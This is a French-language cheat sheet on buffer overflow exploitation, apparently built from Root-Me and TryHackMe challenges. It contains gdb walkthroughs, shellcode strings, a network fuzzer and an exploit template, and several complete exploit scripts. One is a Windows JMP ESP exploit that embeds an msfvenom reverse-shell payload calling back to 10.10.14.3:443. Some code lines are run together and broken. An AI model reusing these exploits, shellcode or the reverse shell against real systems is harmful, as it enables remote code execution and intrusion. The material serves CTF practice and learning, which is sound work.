# BOF - buffer overflow basics

## Ressource

[pwntools](https://github.com/Gallopsled/pwntools)

## les bases

### Commandes gdb

* run : déroule tout le code
* bp : place un breakpoint
* dissass : desassemble une fonction (disass main)
* continue : continue jusqu'a la fin
* next : etape suivante (nexi: i etapes suivante)


### Exemple de base avec gdb et modification du return

Code source:
```c
    /*
    gcc -m32 -fno-stack-protector -o ch15 ch15.c
    */
     
    #include <stdio.h>
    #include <stdlib.h>
     
    void shell() {
        system("/bin/dash"); /* Du coup ici on à pas besoin de charger un shellcode en memoire, super simple */
    }
     
    void sup() {
        printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
    }
     
    main()
    { 
        int var;
        void (*func)()=sup;
        char buf[128];
        fgets(buf,133,stdin);
        func();
    }
```

## Solution 1

On remarque que la fonction qui nous intéresse (system("\bin\dash")) est "isolée" de l’autre partie du code.
 our y accéder il suffit de récupérer son adresse grace à gdb :

```sh
gdb -q ./ch15
disass shell
0x08048478 <+0>:       push   ebp
quit
```

Il suffit maintenant de remplacer la valeur de retour pour la remplacer avec celle obtenue `(echo $(python -c 'print "A" * 128 + "\x64\x84\x04\x08"');cat) | ./ch15` , cat nous permettant d’éviter l’EOF et d’executer un cat .passwd


## Solution 2



```sh
app-systeme-ch15@challenge02:~$ ./ch15
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hey dude ! Waaaaazzaaaaaaaa ?!
app-systeme-ch15@challenge02:~$ ./ch15
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
app-systeme-ch15@challenge02:~$ gdb ch15
```

```sh
gdb$ disass main
Dump of assembler code for function main:
   0x0804848c <+0>:     push   %ebp
   0x0804848d <+1>:     mov    %esp,%ebp
   0x0804848f <+3>:     and    $0xfffffff0,%esp
   0x08048492 <+6>:     sub    $0xa0,%esp
   0x08048498 <+12>:    movl   $0x8048478,0x9c(%esp)
   0x080484a3 <+23>:    mov    0x804a01c,%eax
   0x080484a8 <+28>:    mov    %eax,0x8(%esp)
   0x080484ac <+32>:    movl   $0x85,0x4(%esp)
   0x080484b4 <+40>:    lea    0x1c(%esp),%eax
   0x080484b8 <+44>:    mov    %eax,(%esp)
   0x080484bb <+47>:    call   0x8048360 <fgets@plt>
   0x080484c0 <+52>:    mov    0x9c(%esp),%eax
   0x080484c7 <+59>:    call   *%eax
   0x080484c9 <+61>:    leave
   0x080484ca <+62>:    ret
```

on desassemble la fonction shell:

```sh
gdb$ disass shell
Dump of assembler code for function shell:
   0x08048464 <+0>:     push   %ebp
   0x08048465 <+1>:     mov    %esp,%ebp
   0x08048467 <+3>:     sub    $0x18,%esp
   0x0804846a <+6>:     movl   $0x80485a0,(%esp)
   0x08048471 <+13>:    call   0x8048380 <system@plt>
   0x08048476 <+18>:    leave
   0x08048477 <+19>:    ret
```

Le fonction a appeller se situe donc a l'addresse: 0x08048464    08 04 84 64
IL FAUT DONC ECRIRE 64840408 car x86 = litlle indian

la fonction sup ne nous sert a rien car effectue juste un printf

breakpoint avant la saisie: bp *0x080484bb 
juste appres le imput: bp *0x080484c0

Breackpoint de controle du BOF: bp *0x080484c7

```txt
input:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
=> EIP: 42424242 (B)

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
=> EIP: 42424242 (B)

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB
=> EIP: 41414141 (A)

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB
=> EIP: 41414141 (A)

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB
=> EIP: 41414141 (A)

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB
EIP: 0x42424141

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCBBBBBBBBBBBBBBB
EIP: 0x43434343

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
```

le bof est exploitable via un pipe python:
app-systeme-ch15@challenge02:~$ python -c "print 'A'*300" | ./ch15
Segmentation fault

on peut passer la chaine en bash (hors gdb) de la maniere suivante:

```sh
python -c "print'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + '\x64\x84\x04\x08'" | ./ch15
```
ou dans le input de gdb:
```txt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x64\x84\x04\x08
```

SOLUTION: 

```sh
app-systeme-ch15@challenge02:~$ python -c "print'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + '\x64\x84\x04\x08'" > /tmp/input.txt
app-systeme-ch15@challenge02:~$ cat /tmp/input.txt - | ./ch15        ### attention au "-"                                                                    
ls
ch15  ch15.c
cat .passwd
```



## Découverte / fuzzing

```python
#!/usr/bin/env python3
import socket, time, sys

ip = "10.10.210.186"

port = 1337
timeout = 5
prefix = ""

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

## Template d'exploit

```python
#!/usr/bin/env python3
import socket

ip = "10.10.210.186"
port = 1337

prefix = "OVERFLOW1 " #specific au binaire try hack me
offset = 0
overflow = "A" * offset
retn = ""
padding = "" #"\x90" * 16 #laisser vide pour calcul offset
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```


## exemple avec gdb et modification du return



## exemple avec gdb et shellcode

### chercher les variables d'environnements:

```gdb
 break main
 run
 x/100x $ebp
 x/200x $ebp
 ...
```

### retrouver l'adresse retour et les parametres de la fonction:

```gdb
 i r
info frame
x/16x $ebp
```
### Trouver l'offset ( autrement qu'avec AAAAAAAAAAAAAAAAAAAAAABBBBCCCC ;) )

```sh
michael@k:~$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

## generer son Shellcode:

https://www.exploit-db.com/shellcodes

msfvenom -l payload

## execution directement via C:

```c
#include <stdio.h>

char shellcode[] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
		   "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
		   "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
		   "\x51\x53\x89\xe1\xcd\x80";

int main(int argc, char *argv[])
{
       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();       
}
```
 
 
 ## Conversion de shellcode

```python
 shellcode = "33c983e9bde8ffffffffc05e81760e246d4d7583eefce2f417a4ce9ce785b28adb928d2ba51b434258986af6ca91af813ad83bbbdaf947adecee780c9267b6f275dd7bd1fded5aa698bef7787c9f8b6e4c88b4cf32017aa521675a125d8b96657b0de6bf87e5043662d4a4db0cb55434d5e9efed936e169788522e99b61ac883e6996693a724abb28622864dd5b2efed976e2e830ca975c764ad656ed66e3d9f8636eff69f065ef60cd1efbe51d49b13462a69be40dd84ca71e61947bc9840ca63bdefe7a3e4b7d90ce92f34dff9656c0ce1efbe576c209ba3be3fdedebf354067ba3be50cf78f32da8f6532025764bf87b50c8e0c8ae340525e940a25b30c191258f94052d962c38d659f5ff2e0dff894970bd587b69b6ae48408dca9801cda87e564bf"
out = ""
i = 0
for c in shellcode:
    i+=1
    if i%2 == 0:
        #print(shellcode[(i-2):i]
        out += "0x" + shellcode[(i-2):i] + ", "
print(out)
```
 
 

## exemple de Bof:

```c
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
  
struct EnvInfo
{
  char home[128];
  char username[128];
  char shell[128];  
  char path[128];  
};
  
  
struct EnvInfo GetEnv(void)
{
  struct EnvInfo env;
  char *ptr;
    
  if((ptr = getenv("HOME")) == NULL)
    {
      printf("[-] Can't find HOME.\n");
      exit(0);
    }
  strcpy(env.home, ptr);
  if((ptr = getenv("USERNAME")) == NULL)
    {
      printf("[-] Can't find USERNAME.\n");
      exit(0);
    }
  strcpy(env.username, ptr);
  if((ptr = getenv("SHELL")) == NULL)
    {
      printf("[-] Can't find SHELL.\n");
      exit(0);
    }
  strcpy(env.shell, ptr);
  if((ptr = getenv("PATH")) == NULL)
    {
      printf("[-] Can't find PATH.\n");
      exit(0);
    }
  strcpy(env.path, ptr);
  return env;
}
  
int main(void)
{
  struct EnvInfo env;
   
  printf("[+] Getting env...\n");
  env = GetEnv();
   
  printf("HOME     = %s\n", env.home);
  printf("USERNAME = %s\n", env.username);
  printf("SHELL    = %s\n", env.shell);
  printf("PATH     = %s\n", env.path);
   
  return 0;   
}
```

solutions : 

```python 
#!/usr/bin/env python2
from struct import pack
 
p = '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'
 
with open('/tmp/home', 'wb') as f:
    f.write(p)
 
# padding
p = 'A' * (0x9C + 4)
  
# Gadget return (do nothing)
p += pack('<I', 0x08048474)
 
# argument 1 random data address (shell code stored here then exec after return)
p += pack('<I', 0x0804a004) * 2
 
 
with open('/tmp/path', 'wb') as f:
     f.write(p)
```

### Télécharger

HOME=$(cat /tmp/home) PATH=$(cat /tmp/path) ./ch8


## BOF brute force addresses

Si décalage à code du debugger.

faire un ctrl-c avant la fin jusqu'au "#" du shell. 


```python
import os
for i in range(0,256):
  os.system("""/usr/sbin/readfile $(python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"A"*(88-27)+"{}\xe6\xff\xff\xff\x7f"')""".format("\\x"+hex(i).split('x')[1]))
```

## génération des "badchars"

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```


## exemple BOF WINDOWS JMP ESP

```python
import socket,sys #https://github.com/gh0x0st/Buffer_Overflow

address = '127.0.0.1'port = 5555
Name= b'Admin'
Password= b'P@$$worD'
#récecriture de l'EIP par 424242
buffer1 = Password + b'A'*1020 + b"B"*4 #BoF ok, récriture de la valeur de l'EIP par 424242
##récecriture de l'EIP par 42424242 et ESP pointe vers "CDDDDDDD"
buffer2 = Password + b'A'*1020 + b"B"*4 + b"C" + b"D"*200

#ADRESSE de début des AAAAA: 00FBF854#ADRESSE de l'EIP: 00FBFC50 (adresse varie avec l'aslr... 
retour = b"\x73\x6d\x47\x10" # JMP ESP a l'adresse 10476d73 (trouvé via le debugger)

#TO DO: trier les badchars
#└──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -b "\x00" -f py

buf =  b""
buf += b"\xda\xc2\xb8\x8b\xd1\x66\x71\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x52\x83\xc3\x04\x31\x43\x13\x03\xc8\xc2\x84"buf += b"\x84\x32\x0c\xca\x67\xca\xcd\xab\xee\x2f\xfc\xeb\x95"buf += b"\x24\xaf\xdb\xde\x68\x5c\x97\xb3\x98\xd7\xd5\x1b\xaf"
buf += b"\x50\x53\x7a\x9e\x61\xc8\xbe\x81\xe1\x13\x93\x61\xdb"buf += b"\xdb\xe6\x60\x1c\x01\x0a\x30\xf5\x4d\xb9\xa4\x72\x1b"buf += b"\x02\x4f\xc8\x8d\x02\xac\x99\xac\x23\x63\x91\xf6\xe3"
buf += b"\x82\x76\x83\xad\x9c\x9b\xae\x64\x17\x6f\x44\x77\xf1"buf += b"\xa1\xa5\xd4\x3c\x0e\x54\x24\x79\xa9\x87\x53\x73\xc9"buf += b"\x3a\x64\x40\xb3\xe0\xe1\x52\x13\x62\x51\xbe\xa5\xa7"
buf += b"\x04\x35\xa9\x0c\x42\x11\xae\x93\x87\x2a\xca\x18\x26"buf += b"\xfc\x5a\x5a\x0d\xd8\x07\x38\x2c\x79\xe2\xef\x51\x99"buf += b"\x4d\x4f\xf4\xd2\x60\x84\x85\xb9\xec\x69\xa4\x41\xed"
buf += b"\xe5\xbf\x32\xdf\xaa\x6b\xdc\x53\x22\xb2\x1b\x93\x19"buf += b"\x02\xb3\x6a\xa2\x73\x9a\xa8\xf6\x23\xb4\x19\x77\xa8"buf += b"\x44\xa5\xa2\x7f\x14\x09\x1d\xc0\xc4\xe9\xcd\xa8\x0e"
buf += b"\xe6\x32\xc8\x31\x2c\x5b\x63\xc8\xa7\x6e\x7e\xdc\x34"buf += b"\x07\x7c\xe0\x3b\x6c\x09\x06\x51\x82\x5c\x91\xce\x3b"buf += b"\xc5\x69\x6e\xc3\xd3\x14\xb0\x4f\xd0\xe9\x7f\xb8\x9d"
buf += b"\xf9\xe8\x48\xe8\xa3\xbf\x57\xc6\xcb\x5c\xc5\x8d\x0b"buf += b"\x2a\xf6\x19\x5c\x7b\xc8\x53\x08\x91\x73\xca\x2e\x68"buf += b"\xe5\x35\xea\xb7\xd6\xb8\xf3\x3a\x62\x9f\xe3\x82\x6b"
buf += b"\x9b\x57\x5b\x3a\x75\x01\x1d\x94\x37\xfb\xf7\x4b\x9e"buf += b"\x6b\x81\xa7\x21\xed\x8e\xed\xd7\x11\x3e\x58\xae\x2e"buf += b"\x8f\x0c\x26\x57\xed\xac\xc9\x82\xb5\xdd\x83\x8e\x9c"
buf += b"\x75\x4a\x5b\x9d\x1b\x6d\xb6\xe2\x25\xee\x32\x9b\xd1"buf += b"\xee\x37\x9e\x9e\xa8\xa4\xd2\x8f\x5c\xca\x41\xaf\x74"


buffer3 =  b'A'*1028 + retour + b'\x90'*40 + buf + b'\x90'*40


try:
    print('[+] Connexion')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
    s.connect((address,port))
    r = s.recv(1024)    print(r)
    print('[+] Sending Access Name')    
    s.send(Name + b'\r\n')    
    r = s.recv(1024)    
    print(r) #Acces Password
    """    
    print('[+] Sending Access Password')    
    s.send(Password + b'\r\n')    
    r = s.recv(1024)    print(r) #Correct Password
    """
    print('[+] Sending buffer1')    
    s.send(buffer3 + b'\r\n')    
    r = s.recv(1024)    
    print(r) #Acces Password  
except:    
    print('[!] Error')    
    sys.exit(0)
finally:
    s.close()
```

## exemple de bof via une socket

```python
#!/usr/bin/env python3

import socket
import struct
import time


#shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68'
shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x5a\x2f\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x2f\x61\x70\x70\x2d\x73\x79\x73\x74\x65\x6d\x65\x2f\x63\x68\x34\x35\x2f\x2e\x70\x61\x73\x73\x77\x64'

offset = 168 - 4 - len(shellcode) # 4 = longueur de l'address retour
print("[*]offset= {}".format(offset))

#connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('challenge04.root-me.org', 61045))
print(s.recv(1024).decode())
time.sleep(1)

#addresse de la variable
s.send(b'A\n')
rep = s.recv(4096)
return_addr = rep.decode().split(":")[0]
return_addr = struct.pack('I', int( return_addr , 16))
print("[*] return_addr = {}\n".format(return_addr))

s.send(b'y\n')
print(s.recv(1024).decode())

Payload = shellcode + b'A'*offset + return_addr + b'\n'
print("[*] Envoi de {}".format(Payload))
s.send(Payload)
print(s.recv(4096).decode())

s.send(b'n\n')
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
```

## Exemple ARM

```txt
## ARM
The ARM stack
Let’s begin by taking a look at how the stack  is handled in ARM. The stack in ARM architecture is similar to the stack  in Intel x86. However, there are some key differences we should take  note of.
We will keep the following two points in mind while working through the next sections.

1. Function parameters are passed using registers r0-r3. Any additional parameters are pushed onto the stack.
2. The return address to the previous function can either be pushed onto the stack or stored in the link register (lr).



Buffer Overflows on ARM
Now  that we have briefly reviewed the stack and how functions are called in  the ARM architecture, we will begin experimenting with buffer  overflows.
For our first example of buffer overflow, we’ll be  examining a type of vulnerable application commonly found in intro stack  smashing challenges. Exploitation of this code will more or less follow  the same techniques used in Intel x86 exploitation.
                                
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win(){
    printf("You win!\n");
    exit(0);
}

int main(int argc, char** argv){
    char buf[10];
    strcpy( buf, argv[1] );
    return 0;
}


In  this basic example program, we can see that the main function allocates  a char buffer of length 10, copies the first command line argument into  the buffer, and then exits. However, one key vulnerability worth noting  in this application is the use of strcpy. The function “strcpy" is  inherently dangerous, as it performs no bounds checking, and will read  in a string until a null byte is found. We can use this vulnerability to  overflow the space allocated on the stack for “buf”, and modify  additional data on the stack. Let’s start this application and examine  the stack using a valid input
(gdb) disassemble main
Dump of assembler code for function main:
   0x00010498 <+0>:    push    {r11, lr}
   0x0001049c <+4>:    add    r11, sp, #4
   0x000104a0 <+8>:    sub    sp, sp, #24
   0x000104a4 <+12>:    str    r0, [r11, #-24]
   0x000104a8 <+16>:    str    r1, [r11, #-28]
   0x000104ac <+20>:    ldr    r3, [r11, #-28]
   0x000104b0 <+24>:    add    r3, r3, #4
   0x000104b4 <+28>:    ldr    r3, [r3]
   0x000104b8 <+32>:    sub    r2, r11, #16
   0x000104bc <+36>:    mov    r0, r2
   0x000104c0 <+40>:    mov    r1, r3
   0x000104c4 <+44>:    bl    0x1030c
   0x000104c8 <+48>:    mov    r3, #0
   0x000104cc <+52>:    mov    r0, r3
   0x000104d0 <+56>:    sub    sp, r11, #4
   0x000104d4 <+60>:    pop    {r11, pc}
End of assembler dump.
(gdb)
We’ll set a breakpoint right after the strcpy call, and examine the stack.
                                                                                                                        Let’s consider the diagram of the memory layout here.
                                                                                                                        Now  if we leverage the ability to write as much data to memory using the  strcpy function, let’s construct the stack layout after the call to  strcpy.
                                                                                                                        ow that we have considered the stack layout, let’s test our hypothesis in gdb.
                                                                                                                        We  can see that we have effectively written over the return address stored  on the stack, giving us a segfault when trying to direct flow to  0x43434342. This error also confirms the offset of the return address,  allowing us to leverage this vulnerability.
 
For this example,  we’ll simply redirect control to the “win” function of our application.  Let’s disassemble this function and find the address of the first  instruction.
                                                                                                                        Now that we have our instruction, we should be able to craft our exploit as follows.
                                                                                                                        $ ./vuln1 $(perl -e 'print "AAAAAAAAAAAABBBB\x7c\x04\x01";')
                                                                                                                        Success!  We have successfully redirected the flow to the “win” function. Let’s  examine this in gdb to see how this redirection worked.
 
We’ll begin by setting a breakpoint right before strcpy is called. 
```